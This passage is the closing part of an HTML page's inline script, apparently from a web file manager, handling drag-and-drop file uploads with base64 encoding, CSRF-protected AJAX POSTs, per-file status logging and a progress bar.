        for (var i = 0; i < files.length; i++) queue.push(files[i]);
        total += files.length; updateBar();
        if (!busy) next();
    }
    function next() {
        if (queue.length === 0) { busy = false; updateBar(); setTimeout(function(){location.reload();}, 600); return; }
        busy = true;
        var file = queue.shift();
        var reader = new FileReader();
        reader.onload = function (e) {
            var b64 = e.target.result;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '?action=upload_ajax&dir=' + encodeURIComponent(FM_DIR), true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('X-CSRF-Token', FM_CSRF);
            xhr.onload = function () {
                var res;
                try { res = JSON.parse(xhr.responseText); }
                catch (err) {
                    logLine('✘ ' + file.name + ' — bad response (HTTP ' + xhr.status + ')', true);
                    done++; updateBar(); next(); return;
                }
                if (res.ok) logLine('✔ ' + res.message);
                else        logLine('✘ ' + file.name + ' — ' + res.error, true);
                done++; updateBar(); next();
            };
            xhr.onerror = function () { logLine('✘ ' + file.name + ' — network error', true); done++; updateBar(); next(); };
            xhr.send(JSON.stringify({ name: file.name, data: b64, csrf: FM_CSRF }));
        };
        reader.onerror = function () { logLine('✘ ' + file.name + ' — FileReader error', true); done++; updateBar(); next(); };
        reader.readAsDataURL(file);
    }
    input.addEventListener('change', function () { enqueue(input.files); input.value = ''; });
    drop.addEventListener('click', function () { input.click(); });
    ['dragenter','dragover'].forEach(function(ev){ drop.addEventListener(ev, function(e){ e.preventDefault(); drop.classList.add('hover'); }); });
    ['dragleave','drop'].forEach(function(ev){ drop.addEventListener(ev, function(e){ e.preventDefault(); drop.classList.remove('hover'); }); });
    drop.addEventListener('drop', function (e) { if (e.dataTransfer && e.dataTransfer.files) enqueue(e.dataTransfer.files); });
    window.addEventListener('dragover', function(e){ e.preventDefault(); });
    window.addEventListener('drop',     function(e){ e.preventDefault(); });
})();
</script>

</body>
</html>
